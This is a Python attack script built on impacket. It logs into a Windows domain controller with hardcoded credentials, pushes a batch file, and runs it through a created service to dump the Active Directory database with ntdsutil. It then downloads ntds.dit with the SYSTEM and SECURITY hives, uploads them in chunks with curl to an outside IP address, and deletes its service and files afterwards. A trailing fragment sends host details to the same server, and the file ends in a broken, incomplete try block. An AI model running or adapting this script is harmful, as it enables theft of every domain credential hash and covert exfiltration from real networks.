#!/usr/bin/env python3
# NTDS IFM stage: push bat -> SCMR service -> poll -> fetch SYSTEM/SECURITY/ntds.dit -> exfil raw
import sys, os, io, time, subprocess
sys.path.insert(0, "/tmp/imp")
from impacket.smbconnection import SMBConnection

IP = "10.61.10.11"
U = "rez"; P = "!QAZxsw2"; DOM = "MLT"
ND = "/tmp/.ND"
LOG = "/tmp/.NDL.txt"
os.makedirs(ND, exist_ok=True)
wlog = open(LOG, "wb")
def w(s):
    if isinstance(s, str): s = s.encode("utf-8", "replace")
    wlog.write(s + b"\n"); wlog.flush()

BAT = b'@echo off\r\nntdsutil "ac i ntds" ifm "create full C:\\nd" q q > C:\\Windows\\Temp\\nd.log 2>&1\r\necho done > C:\\Windows\\Temp\\nd.done\r\n'

def smb():
    c = SMBConnection(IP, IP, timeout=15)
    c.login(U, P, DOM, "", "")
    return c

def post_file(path, name):
    subprocess.run(["curl", "-sm", "280", "-X", "POST", "--data-binary", "@" + path,
                    "http://131.123.43.239/up", "-H", "X-Name: " + name])

def exfil(local):
    sz = os.path.getsize(local)
    w("exfil %s %d bytes" % (local, sz))
    if sz <= 25000000:
        post_file(local, "mel2_" + os.path.basename(local))
    else:
        d = ND + "/p_" + os.path.basename(local)
        os.makedirs(d, exist_ok=True)
        subprocess.run(["split", "-b", "20000k", "-a", "3", local, d + "/x"])
        for f in sorted(os.listdir(d)):
            post_file(d + "/" + f, "mel2_" + os.path.basename(local) + "_part" + f)

try:
    c = smb()
    c.putFile("C$", "Windows\\Temp\\.nd.bat", io.BytesIO(BAT).read)
    w("bat pushed")
    c.logoff()
except Exception as e:
    w("push ERR " + str(e)[:150])

# service exec
CRD = DOM + "/" + U + ":" + P + "@" + IP
def svc(action):
    r = subprocess.run(["python3", "/tmp/.svc.py", "-target-ip", IP, CRD, action, "-name", "ndX9", "-display", "ndX9", "-path", "cmd /c C:\\Windows\\Temp\\.nd.bat"] if action == "create" else ["python3", "/tmp/.svc.py", "-target-ip", IP, CRD, action, "-name", "ndX9"], capture_output=True, timeout=90)
    w("svc %s rc=%d %s" % (action, r.returncode, (r.stdout + r.stderr).decode("utf-8", "replace")[-200:]))
svc("create")
svc("start")

got = False
for i in range(40):
    time.sleep(15)
    try:
        c = smb()
        bio = io.BytesIO()
        c.getFile("C$", "Windows\\Temp\\nd.done", bio.write)
        c.logoff()
        got = True
        w("nd.done seen at %d" % (i * 15))
        break
    except Exception:
        pass
if not got:
    w("TIMEOUT waiting nd.done")

# fetch log
try:
    c = smb()
    bio = io.BytesIO()
    c.getFile("C$", "Windows\\Temp\\nd.log", bio.write)
    w("== nd.log =="); wlog.write(bio.getvalue()[:20000]); wlog.write(b"\n")
    c.logoff()
except Exception as e:
    w("ndlog ERR " + str(e)[:120])

if got:
    try:
        c = smb()
        # enumerate what IFM produced
        for sub in ("\\nd", "\\nd\\Active Directory", "\\nd\\registry"):
            try:
                for e in c.listPath("C$", sub + "\\*"):
                    w("IFM %s\\%s d=%d" % (sub, e.get_longname(), e.is_directory()))
            except Exception as e2:
                w("enum ERR %s %s" % (sub, str(e2)[:100]))
        c.logoff()
    except Exception as e:
        w("enum outer ERR " + str(e)[:120])
    for tag, remote in (("SYSTEM", "nd\\registry\\SYSTEM"), ("SECURITY", "nd\\registry\\SECURITY"), ("ntds.dit", "nd\\Active Directory\\ntds.dit")):
        try:
            c = smb()
            lf = os.path.join(ND, tag)
            with open(lf, "wb") as fd:
                c.getFile("C$", remote, fd.write)
            c.logoff()
            w("fetched %s -> %s" % (remote, lf))
            exfil(lf)
        except Exception as e:
            w("fetch ERR %s %s" % (remote, str(e)[:150]))

# cleanup
try:
    svc("delete")
    c = smb()
    for f in ("Windows\\Temp\\.nd.bat", "Windows\\Temp\\nd.done"):
        try: c.deleteFile("C$", f)
        except Exception: pass
    c.logoff()
except Exception:
    pass
wlog.close()
subprocess.run(["curl", "-sm", "60", "-X", "POST", "--data-binary", "@" + LOG, "http://131.123.43.239/up", "-H", "X-Name: mel2_ndlog"])
print("NDSTAGE_DONE")

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

